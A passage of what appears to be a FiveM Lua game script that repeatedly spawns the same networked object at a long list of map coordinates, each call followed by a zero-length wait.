        CreateObject(2967811882, 153.71487426758, 470.01754760742, 145.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -202.96701049805, 510.14642333984, 133.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -356.908203125, 521.6982421875, 125.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -419.99758911133, 548.14184570312, 123.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -626.81494140625, 690.35791015625, 151.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -886.74847412109, 861.11743164062, 200.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -740.39318847656, 617.63140869141, 141.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -708.70819091797, 572.42120361328, 148.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 27.549457550049, 247.41278076172, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 184.12426757812, 190.31451416016, 106.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 347.67337036133, 132.57824707031, 105.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 496.16052246094, 76.790908813477, 95.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 665.72528076172, 19.524644851685, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 840.81793212891, -88.717002868652, 83.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 975.80151367188, -173.63159179688, 74.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1101.4017333984, -237.70246887207, 68.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1199.4383544922, -307.15908813477, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1213.1346435547, -378.9147644043, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1267.9310302734, -545.39172363281, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1367.3148193359, -580.54962158203, 75.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1346.5030517578, -640.51617431641, 75.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1292.5853271484, -724.26849365234, 66.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1244.8343505859, -751.23809814453, 61.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1201.3557128906, -755.33068847656, 61.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1170.6009521484, -838.49493408203, 54.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1165.1292724609, -950.17291259766, 47.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1177.6690673828, -1049.4836425781, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1198.9270019531, -1102.0579833984, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1239.6254882812, -1197.4761962891, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1243.2370605469, -1258.1798095703, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1227.9265136719, -1343.5604248047, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1233.1948242188, -1396.0324707031, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1260.0971679688, -1450.5186767578, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1279.4130859375, -1515.7213134766, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1344.0708007812, -1611.6140136719, 55.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1391.5943603516, -1700.3395996094, 65.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1406.8663330078, -1762.0474853516, 65.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1427.9632568359, -1876.1088867188, 73.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1356.7377929688, -1986.7507324219, 59.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1246.3970947266, -2045.0302734375, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1105.5281982422, -2072.205078125, 38.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 1031.8028564453, -2077.447265625, 32.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 891.376953125, -2072.0400390625, 32.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 755.24206542969, -2052.04296875, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 655.8369140625, -2045.7436523438, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 559.25738525391, -2039.2030029297, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 440.89465332031, -2107.9562988281, 22.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 339.88040161133, -2158.240234375, 13.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 110.77151489258, -2037.2709960938, 18.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -5.143045425415, -2040.0140380859, 18.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -127.17023468018, -2074.2487792969, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -245.7915802002, -2127.5544433594, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -343.80313110352, -2088.5659179688, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -449.30569458008, -2042.1713867188, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -570.93609619141, -1975.4478759766, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -699.91467285156, -1881.1365966797, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -735.6982421875, -1807.0490722656, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -745.45098876953, -1719.0440673828, 29.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -735.30694580078, -1635.3673095703, 22.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -647.47534179688, -1493.9672851562, 13.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -634.03802490234, -1375.2749023438, 10.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -555.75628662109, -1287.1246337891, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -525.64581298828, -1241.2718505859, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -447.78247070312, -1119.4261474609, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -69.776672363281, -1102.8891601562, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -41.347259521484, -1108.5306396484, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -29.609386444092, -1111.0249023438, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -15.035027503967, -1096.1140136719, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -14.407356262207, -1083.1418457031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -14.407356262207, -1083.1418457031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -29.862161636353, -1079.0012207031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -44.758968353271, -1079.9376220703, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -48.290916442871, -1087.099609375, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -40.295188903809, -10.8798828125, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 117.76248931885, -1072.2593994141, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 151.98278808594, -1078.2232666016, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 277.51858520508, -1041.4940185547, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 396.16189575195, -1026.4309082031, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 434.78796386719, -1016.8736572266, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 442.57867431641, -979.51953125, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 442.89279174805, -994.14184570312, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 447.28280639648, -1011.4274902344, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 218.35737609863, -945.61590576172, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 302.07806396484, -581.76257324219, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 308.75802612305, -583.85064697266, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 317.50579833984, -595.49517822266, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 335.30206298828, -596.66156005859, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 341.23889160156, -595.78839111328, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 364.81823730469, -591.33355712891, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 325.32833862305, -213.14144897461, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 330.37448120117, -191.72790527344, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 349.14260864258, -208.07083129883, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 337.06558227539, -241.4069519043, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 298.30191040039, -224.37821960449, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 285.634765625, -216.46199035645, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 262.62716674805, -198.80781555176, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 245.96669006348, -186.02375793457, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 916.44506835938, 37.975803375244, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, 936.10784912109, 65.433235168457, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -175.96006774902, 851.95654296875, 232.2336730957, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -378.96408081055, -665.22149658203, 37.331523895264, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -400.55596923828, -684.08380126953, 38.648769378662, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -424.40484619141, -683.000976562, 41.7034034729, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -454.91082763672, -659.82568359375, 32.939640045166, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -526.60095214844, -655.23120117188, 33.032760620117, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -548.05670166016, -652.36499023438, 33.029022216797, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -549.81390380859, -697.82177734375, 33.038799285889, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -545.24224853516, -727.92510986328, 32.671539306641, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -520.80108642578, -754.56994628906, 31.823480606079, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -512.77209472656, -787.97338867188, 30.698291778564, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -511.87390136719, -818.08868408203, 30.118923187256, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -529.15905761719, -836.0380859375, 30.150640487671, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -551.88409423828, -832.03967285156, 28.91349029541, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -585.46600341797, -826.14312744141, 27.006490707397, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -610.14520263672, -821.81286621094, 25.464250564575, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -628.9306640625, -803.87738037109, 24.981843948364, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -637.81195068359, -785.80139160156, 25.130237579346, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -633.58489990234, -758.08648681641, 26.000982284546, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -629.87268066406, -734.35369873047, 27.382390975952, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -634.79791259766, -715.943359375, 28.945636749268, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -640.24420166016, -696.60284423828, 30.309741973877, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -634.990234375, -678.34259033203, 31.290117263794, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -628.08715820312, -654.33892822266, 31.468461990356, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -622.80981445312, -636.04864501953, 31.568452835083, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -624.82916259766, -617.20471191406, 32.589164733887, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -628.06488037109, -587.33911132812, 34.198680877686, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -631.78466796875, -571.66296386719, 34.756660461426, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -643.56799316406, -549.61889648438, 34.542552947998, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -640.8134765625, -537.90405273438, 34.997482299805, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -635.07604980469, -513.45190429688, 35.664726257324, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -628.10278320312, -421.34710693359, 34.564311981201, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -629.86151123047, -401.3056640625, 34.559482574463, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -631.65686035156, -380.25494384766, 34.561431884766, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -619.43371582031, -365.70248413086, 36.288410186768, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -613.52569580078, -337.9553527832, 36.612091064453, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -601.14410400391, -329.03750610352, 35.440940856934, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -623.30218505859, -322.57138061523, 36.568145751953, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -651.68695068359, -315.99667358398, 35.298564910889, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -660.08483886719, -294.44018554688, 35.33576965332, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -669.49005126953, -270.23934936523, 35.905090332031, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -675.63958740234, -254.40756225586, 36.236812591553, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -685.41461181641, -235.52954101562, 36.507305145264, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -699.59857177734, -220.75393676758, 36.83130645752, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -720.09216308594, -231.41983032227, 36.841335296631, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -744.83020019531, -244.68208312988, 36.840751647949, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -763.2548828125, -249.6580657959, 37.007606506348, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -788.52966308594, -256.30065917969, 37.245109558105, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -802.20819091797, -253.92761230469, 36.788028717041, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -808.58575439453, -242.59887695312, 37.036464691162, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -820.70690917969, -214.9810333252, 37.704189300537, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -830.81787109375, -191.96983337402, 37.444049835205, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -844.55413818359, -175.86039733887, 37.463500976562, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -858.94464111328, -159.00291442871, 37.669784545898, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -876.65307617188, -170.47099304199, 38.014739990234, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -901.49310302734, -183.6675567627, 37.530975341797, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -921.02185058594, -194.07048034668, 37.495845794678, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -944.10266113281, -195.88412475586, 37.495014190674, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -968.55554199219, -200.96894836426, 37.222003936768, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -988.82012939453, -220.45167541504, 37.907089233398, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1024.4562988281, -241.43873596191, 37.525581359863, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1085.2475585938, -274.20718383789, 37.617164611816, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1103.4658203125, -269.15484619141, 37.867721557617, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1126.8005371094, -281.48663330078, 38.657535552979, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1148.359375, -292.28182983398, 38.791648864746, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1170.48828125, -291.85784912109, 38.992107391357, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1193.6276855469, -291.40768432617, 38.889110565186, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1218.7214355469, -290.92233276367, 37.657947540283, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1233.4307861328, -303.12777709961, 37.736988067627, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1248.2092285156, -315.27133178711, 37.84058380127, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1267.5900878906, -331.3115234375, 36.98416519165, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1283.8361816406, -344.75610351562, 36.470161437988, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1305.3353271484, -356.01519775391, 36.613246917725, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1334.1020507812, -360.79891967773, 36.65678024292, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1350.9398193359, -363.59573364258, 36.494960784912, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1367.2520751953, -379.93838500977, 36.652248382568, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1380.2022705078, -394.00366210938, 36.445823669434, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1402.9261474609, -398.17565917969, 36.796722412109, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1423.9675292969, -410.1028137207, 36.635139465332, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1441.4888916016, -420.03536987305, 36.128063201904, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1453.7445068359, -426.98056030273, 35.317489624023, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1475.6639404297, -439.37313842773, 35.271514892578, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1489.6983642578, -447.29193115234, 35.367473602295, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1501.1840820312, -453.77963256836, 35.336555480957, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1519.5579833984, -464.14825439453, 35.0448608398, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1533.578125, -472.01034545898, 35.126083374023, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1548.4698486328, -480.34732055664, 35.123199462891, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1560.7679443359, -487.18835449219, 35.087757110596, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1563.197265625, -499.99365234375, 35.675567626953, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1581.5412597656, -515.58569335938, 35.297256469727, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1605.193359375, -520.12579345703, 34.724109649658, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1688.1834716797, -528.16271972656, 40.576705932617, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1721.0336914062, -510.43545532227, 40.12907409668, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1741.0587158203, -501.48364257812, 38.634918212891, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1756.7415771484, -481.97271728516, 40.477088928223, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1769.8996582031, -465.51202392578, 41.534847259521, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1782.4383544922, -449.83868408203, 41.548976898193, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1804.0675048828, -439.05447387695, 42.195014953613, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1819.3243408203, -431.49542236328, 42.949752807617, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1831.8289794922, -425.26312255859, 43.874549865723, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1853.2891845703, -414.64498901367, 45.302425384521, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1868.5047607422, -407.18606567383, 46.350208282471, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1885.1983642578, -384.8176574707, 48.292461395264, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1890.3519287109, -366.56503295898, 48.854564666748, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1884.8326416016, -352.58810424805, 49.027431488037, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1876.5070800781, -331.61865234375, 47.802089691162, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1846.9636230469, -276.33001708984, 46.736312866211, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1819.0274658203, -325.36376953125, 45.809062957764, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1815.0964355469, -339.87322998047, 45.582927703857, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1808.5787353516, -364.11291503906, 44.005798339844, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1802.4747314453, -385.29006958008, 42.198215484619, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1790.9311523438, -428.03890991211, 38.48904800415, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1788.2253417969, -444.82955932617, 36.995174407959, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1784.5886230469, -467.58825683594, 34.884159088135, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1779.6987304688, -498.20559692383, 32.018699645996, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1774.1787109375, -532.76300048828, 28.706546783447, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1769.2905273438, -563.36108398438, 25.689037322998, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1766.2933349609, -582.12066650391, 23.8088016501, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1768.0249023438, -628.46899414062, 10.519196510315, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1759.4582519531, -646.53729248047, 10.309303283691, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1751.3765869141, -663.78558349609, 10.14768409729, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1740.7327880859, -686.55798339844, 10.167251586914, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1713.8133544922, -719.93347167969, 10.937111854553, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1696.1872558594, -733.31097412109, 11.090492248535, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1676.1856689453, -748.51867675781, 9.9981365203857, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1665.0916748047, -758.46258544922, 12.244045257568, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1647.5239257812, -776.37884521484, 13.427575111389, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1651.6759033203, -799.07305908203, 12.3508644104, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1656.9287109375, -823.55224609375, 10.77232170105, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1662.8148193359, -850.9658203125, 8.9593496322632, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1666.8171386719, -869.54602050781, 8.6330251693726, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1671.4582519531, -891.08728027344, 8.290337562561, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1676.3131103516, -913.60424804688, 7.8747358322144, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1679.9108886719, -930.2587890625, 7.4615921974182, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1684.5755615234, -951.86242675781, 7.5586032867432, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1689.5715332031, -975.40484619141, 6.8873271942139, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1693.1550292969, -992.03637695312, 6.3932785987854, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1657.939453125, -1028.4793701172, 12.766311645508, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1674.8597412109, -1044.0367431641, 12.859534263611, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1688.9105224609, -1056.8914794922, 12.827094078064, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1706.6948242188, -1073.1491699219, 12.829881668091, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1842.8005371094, -1232.2490234375, 12.765271186829, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1859.7833251953, -1221.6228027344, 13.040806770325, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1879.8327636719, -1201.8630371094, 13.140325546265, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1818.8970947266, -1244.9155273438, 16.184650421143, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1667.5478515625, -1112.1121826172, 15.34307384491, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1488.2962646484, -956.50500488281, 8.6661567687988, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1481.39453125, -965.09893798828, 9.0651473999023, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1442.4974365234, -02.0303344727, 8.0529880523682, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1426.8947753906, -1020.1224975586, 4.8073205947876, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1409.9012451172, -1039.7980957031, 4.3698844909668, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1390.2004394531, -1062.5466308594, 3.8684072494507, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1375.0466308594, -1080.0139160156, 3.980809211731, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1366.4007568359, -1114.6849365234, 8.4048643112183, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1364.3050537109, -1128.5925292969, 8.2246036529541, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1360.8507080078, -1151.4663085938, 7.1339063644409, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1358.1575927734, -1169.2646484375, 5.4720897674561, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1357.9407958984, -1197.0061035156, 4.2607550621033, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1361.3116455078, -1217.8570556641, 4.3437147140503, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1355.15234375, -1240.2905273438, 4.6479821205139, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1345.3043212891, -1262.2491455078, 6.5375714302063, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1335.3063964844, -1284.5822753906, 7.0228791236877, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1330.1655273438, -1297.8234863281, 6.3680057525635, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1324.9270019531, -1331.2257080078, 5.0359969139099, true, true, true)
            Citizen.Wait(0)
        CreateObject(2967811882, -1317.7286376953, -1348.9234619141, 5.4501256942749, true, true, true)
            Citizen.Wait(0)
